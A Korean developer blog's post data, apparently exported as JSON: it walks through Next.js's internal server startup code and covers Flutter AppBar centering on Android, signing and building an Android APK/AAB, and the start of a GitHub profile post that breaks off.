부족한 나로써는 이해가 되지 않지만...  \n일단 더 추적해봤다.\n\n저 전달인자인 **\\_startServer**를 추적해보니...  \n**node_modules/next/dist/server/start-server.d.ts** 저 파일로 연결이 되었다.\n\n```typescript\n//node_modules/next/dist/server/start-server.d.ts\n\nimport type { NextServerOptions, NextServer } from \"../next\"\ninterface StartServerOptions extends NextServerOptions {\n  allowRetry?: boolean\n  keepAliveTimeout?: number\n}\nexport declare function startServer(\n  opts: StartServerOptions\n): Promise<NextServer>\nexport {}\n```\n\n<br>\n\n이것만 보니 뭔가 구현체?  \n서버를 띄우거나 하는 것이 없었고,  \n대신 파일 아래를 보니 **start-server.js**파일이 존재했다.\n\n```javascript\n//node_modules/next/dist/server/lib/start-server.js\n\n\"use strict\"\nObject.defineProperty(exports, \"__esModule\", {\n  value: true,\n})\nexports.startServer = startServer\nvar _log = require(\"../../build/output/log\")\nvar _http = _interopRequireDefault(require(\"http\"))\nvar _next = _interopRequireDefault(require(\"../next\"))\nfunction _interopRequireDefault(obj) {\n  return obj && obj.__esModule\n    ? obj\n    : {\n        default: obj,\n      }\n}\nfunction startServer(opts) {\n  let requestHandler\n  const server = _http.default.createServer((req, res) => {\n    return requestHandler(req, res)\n  })\n  //...\n}\n```\n\n<br>\n\n이 코드의 **startServer**함수가 서버를 띄우는 것임을 확인했다.  \n그리고 **server**변수를 보면 \\_http를 통해서 서버를 띄운다.\n\n그리고 저 \\_http는 node 서버임을 확인할 수 있다.  \n난 Next.JS가 어떤 서버를 가지고 있나 싶었는데...  \n실질적으로 **Next.Js**는 Node 서버를 내포하고 있음을 확인할 수 있었다.\n\n그리고 **startServer**에서 조금 더 내려가서 서버가 구동되면 동작하는 코드가 있다.\n\n```javascript\n//node_modules/next/dist/server/lib/start-server.js\n\nserver.on(\"listening\", () => {\n  const addr = server.address()\n  const hostname =\n    !opts.hostname || opts.hostname === \"0.0.0.0\" ? \"localhost\" : opts.hostname\n  const app = (0, _next).default({\n    ...opts,\n    hostname,\n    customServer: false,\n    httpServer: server,\n    port: addr && typeof addr === \"object\" ? addr.port : port,\n  })\n  requestHandler = app.getRequestHandler()\n  upgradeHandler = app.getUpgradeHandler()\n  resolve(app)\n})\nserver.listen(port, opts.hostname)\n```\n\n<br>\n\n저기 보면 또 이상한 **(0, \\_next)**문법을 사용하는데...  \n나중에 알아봐야겠다.\n\n무튼 저기 보면 **\\_next**를 전달인자로 잡는데 이걸 추적하면,  \n**node_modules/next/dist/server/next.d.ts** 이 파일로 이동한다.\n\n```typescript\n//node_modules/next/dist/server/next.d.ts\n\n//...\n\nexport declare class NextServer {\n  private serverPromise?\n  private server?\n  private reqHandlerPromise?\n  private preparedAssetPrefix?\n  options: NextServerOptions\n  constructor(options: NextServerOptions)\n  get hostname(): string | undefined\n  get port(): number | undefined\n  getRequestHandler(): RequestHandler\n  getUpgradeHandler(): (\n    req: IncomingMessage,\n    socket: any,\n    head: any\n  ) => Promise<void>\n  setAssetPrefix(assetPrefix: string): void\n  logError(...args: Parameters<Server[\"logError\"]>): void\n  render(...args: Parameters<Server[\"render\"]>): Promise<void>\n  renderToHTML(\n    ...args: Parameters<Server[\"renderToHTML\"]>\n  ): Promise<string | null>\n  renderError(...args: Parameters<Server[\"renderError\"]>): Promise<void>\n  renderErrorToHTML(\n    ...args: Parameters<Server[\"renderErrorToHTML\"]>\n  ): Promise<string | null>\n  render404(...args: Parameters<Server[\"render404\"]>): Promise<void>\n  serveStatic(...args: Parameters<Server[\"serveStatic\"]>): Promise<void>\n  prepare(): Promise<void>\n  close(): Promise<any>\n  private createServer\n  private loadConfig\n  private getServer\n  private getServerRequestHandler\n}\n```\n\n<br>\n\n위의 **start-server.d.ts**처럼 이 파일도 ts와 같은 경로에 **next.js**파일이 있다.  \n이는 내 프로젝트에서 배포 시 ts => js로 변경을 해서 그렇지 않을까 싶다.  \n결국 배포할 때는 ts가 js로 변하기 때문에?\n\n저기에 있는 함수 중 **render**시리즈를 보면 다음과 같이 구현되어 있다.\n\n```javascript\n//node_modules/next/dist/server/next.js\n\nasync render(...args) {\n        const server = await this.getServer();\n        return server.render(...args);\n    }\n    async renderToHTML(...args) {\n        const server = await this.getServer();\n        return server.renderToHTML(...args);\n    }\n    async renderError(...args) {\n        const server = await this.getServer();\n        return server.renderError(...args);\n    }\n    async renderErrorToHTML(...args) {\n        const server = await this.getServer();\n        return server.renderErrorToHTML(...args);\n    }\n    async render404(...args) {\n        const server = await this.getServer();\n        return server.render404(...args);\n    }\n```\n\n<br>\n\n리턴이 **const server = await this.getServer();**의 객체에 있는 함수를 호출한다.  \n**getServer**함수는 바로 아래에 있다.\n\n```javascript\nasync getServer() {\n        if (!this.serverPromise) {\n            setTimeout(getServerImpl, 10);\n            this.serverPromise = this.loadConfig().then(async (conf)=>{\n                this.server = await this.createServer({\n                    ...this.options,\n                    conf\n                });\n                if (this.preparedAssetPrefix) {\n                    this.server.setAssetPrefix(this.preparedAssetPrefix);\n                }\n                return this.server;\n            });\n        }\n        return this.serverPromise;\n    }\n```\n\n<br>\n\n결국 자신의 함수 중 **createServer**함수를 호출한다.\n\n```javascript\n//node_modules/next/dist/server/next.js\n\nasync createServer(options) {\n        if (options.dev) {\n            const DevServer = require(\"./dev/next-dev-server\").default;\n            return new DevServer(options);\n        }\n        const ServerImplementation = await getServerImpl();\n        return new ServerImplementation(options);\n    }\n```\n\n<br>\n\n여기서 보면 dev 모드일 경우와 일반(아마 운영과 같이 dev를 사용하지 않는)모드로 나눠서 서버를 반환한다.  \n물론 결국 둘다 하나의 클래스에서 파생되었겠지만...  \n그럼 먼저 개발 모드를 보자.\n\n<br>\n\n### Dev\n\n개발 서버 측으로 와보면 이제 실제 Next.js의 서버 구현체를 지나 각 페이지의 구현 및 라우팅, 기타 컴포넌트를 다루는 것들 등...  \n다양한 메서드로 알차게(?) 채워져 있다.  \n뒤늦게 안 사실이지만 상속된 메서드를 구현하는 것이었다.  \nJava나 Dart와 같은 언어처럼 상속 시 **@Override** 어노테이션이 없어서 구분이 안되었다.\n\n```typescript\n//\n//node_modules/next/dist/server/dev/next-dev-server.d.ts\n\nexport interface Options extends ServerOptions {\n  /**\n   * Tells of Next.js is running from the `next dev` command\n   */\n  isNextDevCommand?: boolean\n}\nexport default class DevServer extends Server {\n  ///....\n  protected getAppPathsManifest(): undefined\n  protected getCustomRoutes(): CustomRoutes\n  protected getPreviewProps(): __ApiPreviewProps\n  protected getPagesManifest(): undefined\n  protected getAppPathsManifest(): undefined\n  protected getMiddleware(): MiddlewareRoutingItem | undefined\n  protected getEdgeFunctions(): RoutingItem[]\n  protected getServerComponentManifest(): undefined\n  protected getServerCSSManifest(): undefined\n  protected hasMiddleware(): Promise<boolean>\n  protected ensureMiddleware(): Promise<void>\n  protected ensureEdgeFunction({\n    page,\n    appPaths,\n  }: {\n    page: string\n    appPaths: string[] | null\n  }): Promise<void>\n  generateRoutes(): {\n    headers: import(\"../router\").Route[]\n    rewrites: {\n      beforeFiles: import(\"../router\").Route[]\n      afterFiles: import(\"../router\").Route[]\n      fallback: import(\"../router\").Route[]\n    }\n    redirects: import(\"../router\").Route[]\n    catchAllRoute: import(\"../router\").Route\n    catchAllMiddleware: import(\"../router\").Route[]\n    pageChecker: import(\"../router\").PageChecker\n    useFileSystemPublicRoutes: boolean\n    dynamicRoutes: import(\"../router\").DynamicRoutes | undefined\n    nextConfig: import(\"../config-shared\").NextConfig\n    fsRoutes: import(\"../router\").Route[]\n  }\n  protected generatePublicRoutes(): never[]\n  protected getDynamicRoutes(): never[]\n  protected findPageComponents({\n    pathname,\n    query,\n    params,\n    isAppPath,\n    appPaths,\n  }: {\n    pathname: string\n    query: ParsedUrlQuery\n    params: Params\n    isAppPath: boolean\n    appPaths?: string[] | null\n  }): Promise<FindComponentsResult | null>\n}\n```\n\n<br>\n\n코드는 너무 길어서 다 확인할 수 없지만...  \n**run**함수는 아마 Next API쪽을 다루는게 아닌가 싶다.\n\n```javascript\n//node_modules/next/dist/server/dev/next-dev-server.js\n\n async run(req, res, parsedUrl) {\n        await this.devReady;\n        this.setupWebSocketHandler(undefined, req);\n        const { basePath  } = this.nextConfig;\n        let originalPathname = null;\n        if (basePath && (0, _pathHasPrefix).pathHasPrefix(parsedUrl.pathname || \"/\", basePath)) {\n            // strip basePath before handling dev bundles\n            // If replace ends up replacing the full url it'll be `undefined`, meaning we have to default it to `/`\n            originalPathname = parsedUrl.pathname;\n            parsedUrl.pathname = (0, _removePathPrefix).removePathPrefix(parsedUrl.pathname || \"/\", basePath);\n        }\n        const { pathname  } = parsedUrl;\n        if (pathname.startsWith(\"/_next\")) {\n            if (await (0, _fileExists).fileExists((0, _path).join(this.publicDir, \"_next\"))) {\n                throw new Error(_constants.PUBLIC_DIR_MIDDLEWARE_CONFLICT);\n            }\n        }\n        const { finished =false  } = await this.hotReloader.run(req.originalRequest, res.originalResponse, parsedUrl);\n        if (finished) {\n            return;\n        }\n        if (originalPathname) {\n            // restore the path before continuing so that custom-routes can accurately determine\n            // if they should match against the basePath or not\n            parsedUrl.pathname = originalPathname;\n        }\n        try {\n            return await super.run(req, res, parsedUrl);\n        } catch (error) {\n            res.statusCode = 500;\n            const err = (0, _isError).getProperError(error);\n            try {\n                this.logErrorWithOriginalStack(err).catch(()=>{});\n                return await this.renderError(err, req, res, pathname, {\n                    __NEXT_PAGE: (0, _isError).default(err) && err.page || pathname || \"\"\n                });\n            } catch (internalErr) {\n                console.error(internalErr);\n                res.body(\"Internal Server Error\").send();\n            }\n        }\n    }\n```\n\n<br>\n\n뭐 여기까지만 보고 이거 다 이해하려하면 너무 어려우니,  \n대충 어디서 돌아가는지만 파악하면 될 듯 싶다.  \n그리고 넘어가기 전 이 **DevServer의 상속 구조**를 기억하고 가자.\n\n```javascript\n//var _nextServer = _interopRequireWildcard(require(\"../next-server\"));\n\nclass DevServer extends _nextServer.default {}\n```\n\n<br>\n\n저 \\_nextServer는 운영 서버 클래스를 나타낸다.  \n링크를 타고 가보면 **node_modules/next/dist/server/next-server.d.ts**를 나타냄을 알 수 있다.\n\n<br>\n\n### 운영\n\n아까 보던 곳에서 운영은 다음과 같이 호출하게 되어 있다.\n\n```javascript\n//node_modules/next/dist/server/next.js\n\nconst getServerImpl = async () => {\n  if (ServerImpl === undefined)\n    ServerImpl = (await Promise.resolve(require(\"./next-server\"))).default\n  return ServerImpl\n}\n```\n\n<br>\n\n근데 개발 섭도 결국 운영에서 파생되어 진거고, 이 운영섭은 어떤걸 상속받았을까?\n\n```typescript\nexport default class NextNodeServer extends BaseServer {}\n```\n\n<br>\n\n저 **BaseServer**가 실제 Next.Js의 **서버 중추 역할**을 하는 것을 알 수 있다.  \n우리가 Next.js에서 **yarn dev** 또는 **yarn start**를 수행하면 위의 과정을 거친 후 서버가 구동이 되고,  \n구동된 서버 위에서 route를 호출할 경우 이런 저런 호출을 타고 결국 아래의 함수를 호출한다.\n\n```javascript\n//node_modules/next/dist/server/base-server.js\n\nasync renderToResponse(ctx) {\n        const { res , query , pathname  } = ctx;\n        let page = pathname;\n        const bubbleNoFallback = !!query._nextBubbleNoFallback;\n        delete query._nextBubbleNoFallback;\n        try {\n            // Ensure a request to the URL /accounts/[id] will be treated as a dynamic\n            // route correctly and not loaded immediately without parsing params.\n            if (!(0, _utils1).isDynamicRoute(page)) {\n                const result = await this.renderPageComponent(ctx, bubbleNoFallback);\n                if (result !== false) return result;\n            }\n            if (this.dynamicRoutes) {\n                for (const dynamicRoute of this.dynamicRoutes){\n                    const params = dynamicRoute.match(pathname);\n                    if (!params) {\n                        continue;\n                    }\n                    page = dynamicRoute.page;\n                    const result = await this.renderPageComponent({\n                        ...ctx,\n                        pathname: page,\n                        renderOpts: {\n                            ...ctx.renderOpts,\n                            params\n                        }\n                    }, bubbleNoFallback);\n                    if (result !== false) return result;\n                }\n            }\n            // currently edge functions aren't receiving the x-matched-path\n            // header so we need to fallback to matching the current page\n            // when we weren't able to match via dynamic route to handle\n            // the rewrite case\n            // @ts-expect-error extended in child class web-server\n            if (this.serverOptions.webServerConfig) {\n                // @ts-expect-error extended in child class web-server\n                ctx.pathname = this.serverOptions.webServerConfig.page;\n                const result = await this.renderPageComponent(ctx, bubbleNoFallback);\n                if (result !== false) return result;\n            }\n        } catch (error) {\n            const err = (0, _isError).getProperError(error);\n            if (error instanceof _utils.MissingStaticPage) {\n                console.error(\"Invariant: failed to load static page\", JSON.stringify({\n                    page,\n                    url: ctx.req.url,\n                    matchedPath: ctx.req.headers[\"x-matched-path\"],\n                    initUrl: (0, _requestMeta).getRequestMeta(ctx.req, \"__NEXT_INIT_URL\"),\n                    didRewrite: (0, _requestMeta).getRequestMeta(ctx.req, \"_nextDidRewrite\"),\n                    rewroteUrl: (0, _requestMeta).getRequestMeta(ctx.req, \"_nextRewroteUrl\")\n                }, null, 2));\n                throw err;\n            }\n            if (err instanceof NoFallbackError && bubbleNoFallback) {\n                throw err;\n            }\n            if (err instanceof _utils.DecodeError || err instanceof _utils.NormalizeError) {\n                res.statusCode = 400;\n                return await this.renderErrorToResponse(ctx, err);\n            }\n            res.statusCode = 500;\n            // if pages/500 is present we still need to trigger\n            // /_error `getInitialProps` to allow reporting error\n            if (await this.hasPage(\"/500\")) {\n                ctx.query.__nextCustomErrorRender = \"1\";\n                await this.renderErrorToResponse(ctx, err);\n                delete ctx.query.__nextCustomErrorRender;\n            }\n            const isWrappedError = err instanceof WrappedBuildError;\n            if (!isWrappedError) {\n                if (this.minimalMode && process.env.NEXT_RUNTIME !== \"edge\" || this.renderOpts.dev) {\n                    if ((0, _isError).default(err)) err.page = page;\n                    throw err;\n                }\n                this.logError((0, _isError).getProperError(err));\n            }\n            const response = await this.renderErrorToResponse(ctx, isWrappedError ? err.innerError : err);\n            return response;\n        }\n        if (this.router.catchAllMiddleware[0] && !!ctx.req.headers[\"x-nextjs-data\"] && (!res.statusCode || res.statusCode === 200 || res.statusCode === 404)) {\n            res.setHeader(\"x-nextjs-matched-path\", `${query.__nextLocale ? `/${query.__nextLocale}` : \"\"}${pathname}`);\n            res.statusCode = 200;\n            res.setHeader(\"content-type\", \"application/json\");\n            res.body(\"{}\");\n            res.send();\n            return null;\n        }\n        res.statusCode = 404;\n        return this.renderErrorToResponse(ctx, null);\n    }\n```\n\n<br>\n\n그리고 결국 우리가 실제로 작성하게 되는 **\\_document.tsx**나 **\\_app.tsx**를 랜더링 하며,  \n각 컴포넌트들을 순차적으로 렌더링 하게 된다.\n\n<br>\n\n## 정리\n\n3번 문항의 경우 하나씩 추적하느라 설명이 너무 복잡하고 길었다.  \n개인적으로 이렇게 딥하게 파는걸 좋아하진 않지만...  \n동작을 이해하기 위해서는 필요한 과정이라 생각한다.\n\n물론 서비스 구현에 목적이 있고, 다양한 아이템에 대해 아이디어를 녹여서,  \n결과를 빨리 봐야 하는 사람들에겐 이게 무슨 의미냐 싶겠지만...\n\n어떤식으로든 결국 이 구조를 한번쯤은 까봐야 하는 순간이 올 것이다.  \n이런 딥한걸 싫어하는 나같은 사람을 위해 최소한의 설명으로 풀어내봤다.\n\n과제도 과제였지만, 덕분에 돌아가는 방식을 조금이나마 알게 되어 유익한 시간이었다.  \n이제 다시 뚜껑을 덮고 서비스를 구현해봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"개발을 하고 iOS 시뮬에서는 잘 되었는데... iOS에서는 AppBar의 title이 중앙에 잘 배치되었다.  근데 직접 APK를 만들어서 내 폰에 올려봤더니 왼쪽으로 정렬되어 있었다. 폰이 문제인가 싶어서 시뮬레이터를 돌렸더니 역시 똑같이 나왔다.  왜 이런가 싶었는데 아주 쉽게 해결할 수 있는 문제였다. 그렇다. 저 속성을 true로 주면 깔끔하게 …","fields":{"slug":"/dart_flutter/230627_appbar-center/"},"frontmatter":{"date":"June 27, 2023","title":"(Flutter) AppBar 사용 시 중앙정렬 문제 (Android)","description":null,"tags":["Flutter","Android"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n## 개발을 하고 iOS 시뮬에서는 잘 되었는데...\n\niOS에서는 AppBar의 title이 중앙에 잘 배치되었다.\n\n![](/img02.png)\n\n<br>\n\n근데 직접 APK를 만들어서 내 폰에 올려봤더니 왼쪽으로 정렬되어 있었다.  \n폰이 문제인가 싶어서 시뮬레이터를 돌렸더니 역시 똑같이 나왔다.\n\n<br>\n\n![](/img03.png)\n\n왜 이런가 싶었는데 아주 쉽게 해결할 수 있는 문제였다.\n\n```dart\nclass AppBar extends StatefulWidget implements PreferredSizeWidget {\n\n  /// {@template flutter.material.appbar.centerTitle}\n  /// Whether the title should be centered.\n  ///\n  /// If this property is null, then [AppBarTheme.centerTitle] of\n  /// [ThemeData.appBarTheme] is used. If that is also null, then value is\n  /// adapted to the current [TargetPlatform].\n  /// {@endtemplate}\n  final bool? centerTitle;\n\n  ///....\n}\n```\n\n그렇다.  \n저 속성을 **true**로 주면 깔끔하게 해결된다.\n\n<br>\n\n![](/img01.png)\n\n<br>\n\n플러터를 이제 막 하는 사람으로써..  \n이런 부분은 좀 신기했다.\n\n둘다 똑같이 표현이 되어야 하는데 속성이 있고 없음으로 인해,  \n안드랑 아이폰 표현이 틀리다니..\n\n앞으로 고생좀 할것 같은 예감이 든다..\n\n```toc\n\n```\n"},{"excerpt":"앱을 만들기 전 폰에서 돌려보고 싶었다. 흑우집합소의 모바일 버전을 슬슬 준비하면서, 플러터를 공부했다. 뭐 일일히 다 본건 아니고, 유튜브랑 노마드코더에서 학습을 했다. 일단 빠르게 결과물을 내는게 중요해서 먼저 예제를 몇 가지 만들어보고 바로 개발해보려 했다. 그래서 노마드코더의 예제를 다 만들고 나서 이걸 폰으로 올려보고 싶었다. 난 아이폰과 안드로…","fields":{"slug":"/dart_flutter/230623_build-android/"},"frontmatter":{"date":"June 23, 2023","title":"Flutter에서 개발한 앱을 직접 폰에서 실행해보기 (Android)","description":"시뮬레이터가 아닌 실제 기기에서 실행해보기","tags":["Flutter","Android"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 앱을 만들기 전 폰에서 돌려보고 싶었다.\n\n[흑우집합소](https://bcow.world)의 모바일 버전을 슬슬 준비하면서, 플러터를 공부했다.  \n뭐 일일히 다 본건 아니고, 유튜브랑 노마드코더에서 학습을 했다.\n\n일단 빠르게 결과물을 내는게 중요해서 먼저 예제를 몇 가지 만들어보고 바로 개발해보려 했다.  \n그래서 노마드코더의 예제를 다 만들고 나서 이걸 폰으로 올려보고 싶었다.\n\n난 아이폰과 안드로이드폰 둘 다 있어서 둘다 올려보려 했지만,  \n아이폰의 경우 몇 가지 설정하고 하는게 있어서 다음 포스팅에 정리해서 올려보기로 하고...\n\n이번 포스팅에서는 안드로이드 폰에 올려보는걸 목표로 해본다.  \n일단 **flutter doctoc**에서 모든 이슈가 없는 상태에서 시작한다.\n\n그리고 결과물은 **abb(Android App Bundle)**라는 앱 번들과 APK로 만들 수 있는데,  \n이번에는 둘 다 만들어볼 예정이다.\n\n사실 abb는 처음봤는데...  \n예전 안드로이드 개발할 때는 APK만 있었는데 이상한게 나왔다...\n\n일단 먼저 서명키를 만드는 것부터 시작한다.\n\n## 서명키 준비\n\n서명키는 앱의 서명을 해주는 키다.  \n이거로 자신이 개발한 앱임을 증명하는데, 자세한 것은 [구글 공식 문서-앱서명](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjxx8vX4tn_AhVlt1YBHSF4BNsQFnoECBQQAQ&url=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Fpublish%2Fapp-signing%3Fhl%3Dko&usg=AOvVaw2un1FO7hYwEdyiNzF43QhT&opi=89978449)을 참고하자.\n\n콘솔로 할 수 있고, 안드로이드 스튜디오를 통해서 할 수도 있다.  \n뭐 당연한 이야기겠지만, 이 키를 소실하면 더 이상 스토어에서 업데이트도 못한다.  \n잘 관리하자.\n\n<br>\n\n### 콘솔\n\n난 맥을 써서 맥을 기준으로 작성했다.\n\n```\nkeytool -genkey -v -keystore ~/my_key.jks -keyalg RSA -keysize 2048 -validity 9125 -alias dev_my_key\n```\n\n옵션은 아래와 같다.\n\n- **genkey**\n  - 키를 생성하는 것\n- **keystore**\n  - 키 저장 파일명 (확장자는 jks)\n- **keyalg**\n  - 키 생성 알고리즘\n- **keysize**\n  - 키 사이즈 (1024, 2048 등)\n- **validity**\n  - 인증서의 유효기간 (단위는 일(Day) 기준)\n- **alias**\n  - 키의 별칭을 지정\n\n이렇게 알맞게 옵션을 정하면 서명키를 만들 수 있다.\n\n<br>\n\n### 안드로이드 스튜디오\n\n이번엔 안드로이스 스튜디오에서 만드는 법을 알아본다.  \n난 VScode를 통해서 플러터를 개발하는데, 안드로이드 스튜디오에서 프로젝트를 열어준다.\n\n![](/img01.png)\n\nVSCode를 쓸 경우 위 사진처럼 **Open in Android Studio**를 사용한다.  \n그럼 안드로이드 스튜디오가 해당 폴더를 기반으로 열린다.\n\n![](/img02.png)\n\n처음 오픈해서 그런지 **gradle** 빌드가 오래 걸린다.  \n한창 자바 스프링 개발할 때가 생각났다. ㅎㅎ\n\n![](/img03.png)\n\n상단 메뉴의 **Build**에서 **Generate Signed Bundle/ APK**를 선택한다.\n\n![](/img04.png)\n\n창이 하나 뜨는데 먼저 **abb**를 만들어본다.  \n물론 아래 APK를 선택해도 무방하다.\n\n<br>\n\n![](/img05.png)\n\n키가 있는 사람이면 그냥 아래대로 내용을 채우면 된다.\n\n- **key store path**\n  - 키 스토어의 경로를 입력한다.\n  - 콘솔의 **keystore**옵션과 같다.\n- **key store password**\n  - 키의 암호를 입력한다.\n- **key alias**\n  - 키의 별칭을 의미한다.\n- **key password**\n  - 별칭의 암호를 입력한다.\n\n위 내용을 작성 후 **Encrypted key export path** 경로에 키 파일이 내보내진다.  \n만약 키가 없다면 **key store path**에서 **Create new...**버튼을 선택한다.\n\n<br>\n\n![](/img09.png)\n\n아래와 같은 항목이 뜨는데 적당히 입력해주자.  \n몇 가지 참고사항을 적자면...\n\n- key의 validity는 25년동안 키의 유효성을 나타낸다.\n- Certificate는 키의 인증 정보를 나타낸다.\n- 따라서 개발용이면 생략해도 좋지만, 배포키라면 정보를 입력하는게 좋다.\n\n## aab 생성\n\n![](/img07.png)\n\n<br>\n\n이렇게 입력하고 next를 누른 경우 Build 결과물을 선택하는게 나오는데 난 release를 선택했다.  \n그리고 기다리면 서명이 다 되고 결과가 출력된다.\n\n<br>\n\n![](/img08.png)\n\n그럼 **android/app/release**경로를 확인하면 **app-release.aab** 파일이 생성된다.\n\n## APK 생성\n\n아마 aab를 폰으로 설치하려면 까다로운 과정이 필요하다.  \n[bundletool](https://github.com/google/bundletool/releases) 이란걸 통해서 apk를 만들고 해야 하는데,  \n이 과정은 이번 포스팅에서 다루지 않는다.\n\n대신 Flutter를 통해서 apk를 생성해보도록 하겠다.\n\n### 키 파일 준비\n\n위에서 만든 키 파일을 준비한다.  \n나 같은 경우 편의를 위해서 안드로이드 디렉토리 밑에 넣어뒀다.\n\nFlutter 디렉토리를 보면 안드, ios 등 디렉토리가 나눠져있다.\n\n![](/img10.png)\n\n저기 디렉토리 안에 **app**이란 곳에 생성한 키 파일인 **key.jks**를 넣어뒀다.\n\n![](/img11.png)\n\n<br>\n\n### 키 정보 파일 추가\n\n키 정보를 담는 property 파일을 하나 만들어준다.  \n경로는 적당한 곳에?  \n난 **app** 디렉토리 밑에 만들었다.\n\n파일명은 임의로 해도 되지만 이번 포스팅에서는 **key.properties**로 정해줬다.  \n안에는 다음과 같이 자신이 작성한 정보를 입력해준다.\n\n```\nstorePassword=[Key Store 암호]\nkeyPassword=[Alise 암호]\nkeyAlias=[Alise 이름]\nstoreFile=[키 파일 위치]\n```\n\n<br>\n\n### build.gradle 수정\n\n저 파일은 참고로 **app디렉토리 밑에 있는 파일**을 의미한다.  \n**android 디렉토리 내에 있는 파일**이 아니다.\n\n먼저 프로퍼티를 가져오는 변수를 정해준다.\n\n```gradle\n...\n\ndef Properties keystoreProperties = new Properties()\ndef keystorePropertiesFile = project.rootProject.file('./app/key.properties');\nif (keystorePropertiesFile.exists()) {\n    keystoreProperties.load(new FileInputStream(keystorePropertiesFile))\n}\n\napply plugin: 'com.android.application'\napply plugin: 'kotlin-android'\napply from: \"$flutterRoot/packages/flutter_tools/gradle/flutter.gradle\"\n\nandroid {\n    namespace \"\"\n    ...\n}\n```\n\n그리고 **android** 속성에 다음과 같이 추가 해준다.\n\n```gradle\n    android {\n        ...\n\n        defaultConfig {\n        // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html).\n        applicationId \"com.example.toonflix\"\n        // You can update the following values to match your application needs.\n        // For more information, see: https://docs.flutter.dev/deployment/android#reviewing-the-gradle-build-configuration.\n        minSdkVersion flutter.minSdkVersion\n        targetSdkVersion flutter.targetSdkVersion\n        versionCode flutterVersionCode.toInteger()\n        versionName flutterVersionName\n    }\n\n    // start of signingConfigs\n    signingConfigs {\n        release {\n            keyAlias keystoreProperties['keyAlias']\n            keyPassword keystoreProperties['keyPassword']\n            storeFile file(keystoreProperties['storeFile'])\n            storePassword keystoreProperties['storePassword']\n        }\n    }\n\n    buildTypes {\n        release {\n            // TODO: Add your own signing config for the release build.\n            // Signing with the debug keys for now, so `flutter run --release` works.\n            // signingConfig signingConfigs.debug\n            signingConfig signingConfigs.release\n        }\n    }\n        ...\n    }\n```\n\n추가된 것은 **signingConfigs**이거다.  \nrelease 빌드 때 서명 정보를 전달한다.\n\n그리고 아래처럼 **buildTypes**정보는 release로 변경한다.\n\n<br>\n\n### flutter build\n\n위 작업까지 끝낸 뒤 flutter를 실행하기 위해 콘솔을 연다.  \n그리고 아래의 명령어를 실행한다.\n\n```\nflutter build apk --split-per-abi\n```\n\n![](./images/230623_build-android/img12.png)\n\n<br>\n\n이렇게 하면 위 처럼 apk가 생성된다.  \n이 중 **arm64**아키텍쳐가 보통 안드로이드 폰에서 돌아가는 것이다.  \n사실 나머지 두 아키텍쳐는 잘 모르겠다.\n\n무튼 **arm64**로 만들어진 apk를 폰으로 옮겨서 설치하면 실행이 잘 된다.\n\n<br>\n\n### 번외 - Proguard 설정\n\n프루가드(Proguard)도 설정할 수 있다.  \n먼저 **app**디렉토리 밑에 **proguard_rules.pro**파일을 생성해준다.\n\n물론 파일명은 원하는대로 작성해도 된다.\n\n```\n## Flutter wrapper\n-keep class io.flutter.app.** { *; }\n-keep class io.flutter.plugin.**  { *; }\n-keep class io.flutter.util.**  { *; }\n-keep class io.flutter.view.**  { *; }\n-keep class io.flutter.**  { *; }\n-keep class io.flutter.plugins.**  { *; }\n-dontwarn io.flutter.embedding.**\n```\n\n위 파일을 추가하고 **build.gradle**의 **buildTypes** 속성에 아래와 같이 수정해준다.\n\n```gradle\nbuildTypes {\n        release {\n            signingConfig signingConfigs.release\n\n            //config proguard\n            minifyEnabled true\n            useProguard true\n            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'\n        }\n    }\n```\n\n여기까지 해주면 된다.  \n근데 가끔 플러터 외부 라이브러리들을 암호화 하다가 에러가 날 수 있다.  \n이 경우 proguard를 포기해야 한다.\n\n## 정리\n\n이거 하는데 약간 시간이 걸렸다 -\\_-;;  \n또 개발해야 하는데 나중에 또 하다 잊을 것 같아서 미리 포스팅해뒀다.\n\n전에는 안드로이드 스튜디오에서 자바로 코드 작성하고, 뭐 하고 해서 apk 만들고...  \n스토어에 배포할 때도 귀찮았는데...\n\n그냥 개발만 하는게 마음도 편하고 쉬운 것 같다.  \n환경 구성 및 배포는 사람을 피곤하게 만든다...\n\n<br>\n\n### 참고\n\n[[Flutter] 안드로이드 앱 배포(APK)](https://velog.io/@cho2kkh/Flutter-안드로이드-앱-배포APK)  \n[Flutter 배포하기](https://ffuny.tistory.com/155)\n\n```toc\n\n```\n"},{"excerpt":"간만에 깃허브를 꾸며 보려고... 최근 직장도 다시 구해볼까 해서 포트폴리오랑 이력서를 아주 조금씩 손보고 있다. 이게 사람이 혼자 일하다보면 뭐랄까... 진전이 없다고 해야하나? 무튼 그래서 돈보다 워라벨 좋은 곳을 찾아보려고 준비중이다. 솔까 우리나라 탑티어 IT회사는 가면 좋은데 개인 시간 내기가 정말 어렵다. 퇴근하고(일단 퇴근이 되나?) 뭐 좀 …","fields":{"slug":"/utils/230612_github_readme/"},"frontmatter":{"date":"June 12, 2023","title":"Github 프로필 꾸미기","description":null,"tags":["Utils","Github"],"series":"Utils","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n![](/img01.png)\n\n# 간만에 깃허브를 꾸며 보려고...\n\n최근 직장도 다시 구해볼까 해서 포트폴리오랑 이력서를 아주 조금씩 손보고 있다.  \n이게 사람이 혼자 일하다보면 뭐랄까... 진전이 없다고 해야하나?\n\n무튼 그래서 돈보다 워라벨 좋은 곳을 찾아보려고 준비중이다.  \n솔까 우리나라 탑티어 IT회사는 가면 좋은데 개인 시간 내기가 정말 어렵다.\n\n퇴근하고(일단 퇴근이 되나?) 뭐 좀 하려 하면 새벽이 된다.  \n게다가 기술에 대한 무한 학습도 해야 하고...\n\n또한 급여도 연 7~9천 그 이상을 줘도 그만큼 일을 키시고,  \n세금으로 엄청 가져간다. (With 4대보험 : 퍼가요~)\n\n그럴바에야 차라리 퇴근하고 부동산이나 주식 공부를 해서 급여 외 소득을 키우는게 나은 것 같다.  \n특히 지금 글을 쓰는 23년 6월 기준 지방 제외 일부 서울 지역과 경기도 지역은 부동산이 다시 꿈틀하고 있다.\n\n급여소득으로는 내가 살 주택이나 미래를 보장할 수 